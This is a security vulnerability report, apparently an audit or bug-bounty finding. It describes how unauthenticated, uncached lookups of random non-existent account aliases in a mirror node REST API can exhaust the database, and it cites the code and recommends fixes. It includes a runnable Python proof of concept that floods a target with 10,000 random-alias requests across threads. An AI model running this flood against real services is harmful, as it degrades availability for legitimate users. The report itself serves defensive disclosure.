### Title
Unauthenticated Sustained Database Load via Uncached Non-Existent Alias Lookups in `getEncodedId()`

### Summary
Any unauthenticated external user can submit syntactically valid base32 alias strings to any REST endpoint that calls `getEncodedId()`. Each request passes format validation, triggers a live database query, and returns a 404 — which is explicitly excluded from the response cache. With no rate limiting and no negative-result caching, an attacker can sustain arbitrary database load by flooding the service with unique valid-format but non-existent aliases.

### Finding Description

**Code path:**

`rest/service/entityService.js`, `getEncodedId()`, lines 125–126:
```js
} else if (AccountAlias.isValid(entityIdString)) {
  return await this.getAccountIdFromAlias(AccountAlias.fromString(entityIdString), requireResult);
}
``` [1](#0-0) 

`AccountAlias.isValid()` in `rest/accountAlias.js` line 41–44 uses the regex `/^(\d{1,5}\.){0,2}[A-Z2-7]+$/`, which accepts any bare base32 string of sufficient length (e.g., `AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD`). [2](#0-1) 

`AccountAlias.fromString()` at lines 51–64: for a bare alias (no shard/realm prefix), `null` is passed for both shard and realm. The `validate()` method at line 28–33 only throws if the value is non-null AND mismatches the configured value — so `null` always passes. The alias is decoded and an `AccountAlias` object is returned without error. [3](#0-2) 

`getAccountFromAlias()` at lines 42–53 then executes `entityFromAliasQuery` directly against the database with the decoded alias bytes. If no entity exists, it returns `null` — no caching occurs at this layer. [4](#0-3) 

**Why the response cache does not help:**

`responseCacheUpdateHandler` at line 95 only caches responses where `httpStatusCodes.isSuccess(res.statusCode)` (i.e., 200–299) or 304. A non-existent alias lookup throws `NotFoundError`, which `httpErrorHandler.js` maps to HTTP 404 — explicitly outside the success range. [5](#0-4) [6](#0-5) [7](#0-6) 

**Root cause:** The system assumes alias lookups will mostly succeed (positive results) and caches those. It makes no provision for caching or throttling negative results, and there is no rate limiting middleware in the REST layer.

### Impact Explanation

Every request with a syntactically valid but non-existent alias causes a full database round-trip (`SELECT id FROM entity WHERE alias = $1`). An attacker generating unique valid base32 strings can sustain a continuous stream of DB queries proportional to their request rate, with zero server-side absorption. This degrades database performance for all legitimate users and can cause query timeouts or connection pool exhaustion, constituting a non-network DoS against the database tier.

### Likelihood Explanation

No authentication or authorization is required. The alias format is trivially constructable — any string matching `[A-Z2-7]{8,}` (minimum valid base32 length) qualifies. An attacker needs only an HTTP client and a loop generating unique base32 strings. The attack is repeatable indefinitely, requires no special knowledge of the system, and is not detectable until DB load is already elevated.

### Recommendation

1. **Cache negative results at the alias lookup layer**: In `getAccountFromAlias()` or `getAccountIdFromAlias()`, cache `null` results (e.g., in Redis with a short TTL such as 30–60 seconds) keyed by the decoded alias bytes. This absorbs repeated lookups for the same non-existent alias.
2. **Cache 404 responses in the response cache**: Extend `responseCacheUpdateHandler` to cache 404 responses with a short TTL (e.g., 5–10 seconds), consistent with how other APIs handle negative caching.
3. **Add rate limiting**: Introduce per-IP or per-endpoint rate limiting middleware in the REST layer, particularly for endpoints that trigger DB lookups by alias.
4. **Validate alias byte length before querying**: The `entity.alias` column stores public key bytes of known lengths (32 bytes for ED25519, 33 bytes for ECDSA). Reject decoded aliases that do not match expected lengths before issuing any DB query.

### Proof of Concept

```bash
# Generate and send 10,000 unique valid-format non-existent aliases
# Each triggers a live DB query; none are cached (404 responses)

python3 -c "
import random, string, requests, threading

BASE32_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'

def make_alias():
    # 40 chars = 25 bytes decoded, valid base32, unlikely to exist
    return ''.join(random.choices(BASE32_CHARS, k=40))

def attack():
    for _ in range(1000):
        alias = make_alias()
        # Any endpoint using getEncodedId(), e.g. /api/v1/accounts/{id}
        r = requests.get(f'http://TARGET/api/v1/accounts/{alias}')
        assert r.status_code == 404  # confirms DB was queried, not cached

threads = [threading.Thread(target=attack) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
print('Done: 10,000 DB queries issued with no caching')
"
```

**Preconditions:** No authentication required. Target must be a running mirror node REST service.
**Trigger:** Each request hits `getEncodedId()` → `AccountAlias.isValid()` passes → `fromString()` succeeds → `getAccountFromAlias()` issues DB query → 404 returned, not cached.
**Result:** Sustained, unbounded database load from unprivileged external requests.

### Citations

**File:** rest/service/entityService.js (L42-53)
```javascript
  async getAccountFromAlias(accountAlias) {
    const rows = await super.getRows(EntityService.entityFromAliasQuery, [accountAlias.alias]);

    if (isEmpty(rows)) {
      return null;
    } else if (rows.length > 1) {
      logger.error(`Incorrect db state: ${rows.length} alive entities matching alias ${accountAlias}`);
      throw new Error(EntityService.multipleAliasMatch);
    }

    return new Entity(rows[0]);
  }
```

**File:** rest/service/entityService.js (L125-126)
```javascript
      } else if (AccountAlias.isValid(entityIdString)) {
        return await this.getAccountIdFromAlias(AccountAlias.fromString(entityIdString), requireResult);
```

**File:** rest/accountAlias.js (L10-43)
```javascript
const accountAliasRegex = /^(\d{1,5}\.){0,2}[A-Z2-7]+$/;
const noShardRealmAccountAliasRegex = /^[A-Z2-7]+$/;
const {common} = getMirrorConfig();

class AccountAlias {
  /**
   * Creates an AccountAlias object.
   * @param {string|null} shard
   * @param {string|null} realm
   * @param {string} base32Alias
   */
  constructor(shard, realm, base32Alias) {
    this.shard = AccountAlias.validate(shard, common.shard, 'shard');
    this.realm = AccountAlias.validate(realm, common.realm, 'realm');
    this.alias = base32.decode(base32Alias);
    this.base32Alias = base32Alias;
  }

  static validate(num, configured, name) {
    if (!isNil(num) && BigInt(num) !== configured) {
      throw new InvalidArgumentError(`Unsupported ${name} ${num}`);
    }
    return configured;
  }

  /**
   * Checks if the accountAlias string is valid
   * @param {string} accountAlias
   * @param {boolean} noShardRealm If shard realm is allowed as a part of the alias.
   * @return {boolean}
   */
  static isValid(accountAlias, noShardRealm = false) {
    const regex = noShardRealm ? noShardRealmAccountAliasRegex : accountAliasRegex;
    return typeof accountAlias === 'string' && regex.test(accountAlias);
```

**File:** rest/accountAlias.js (L51-64)
```javascript
  static fromString(str) {
    if (!AccountAlias.isValid(str)) {
      throw new InvalidArgumentError(`Invalid accountAlias string ${str}`);
    }

    const parts = str.split('.');
    parts.unshift(...[null, null].slice(0, 3 - parts.length));

    try {
      return new AccountAlias(...parts);
    } catch (err) {
      throw new InvalidArgumentError(`Invalid accountAlias string ${str}`);
    }
  }
```

**File:** rest/middleware/responseCacheHandler.js (L95-95)
```javascript
  if (responseBody && responseCacheKey && (isUnmodified || httpStatusCodes.isSuccess(res.statusCode))) {
```

**File:** rest/constants.js (L159-159)
```javascript
  isSuccess: (code) => code >= 200 && code < 300,
```

**File:** rest/middleware/httpErrorHandler.js (L17-18)
```javascript
  if (err instanceof NotFoundError) {
    statusCode = httpStatusCodes.NOT_FOUND;
```
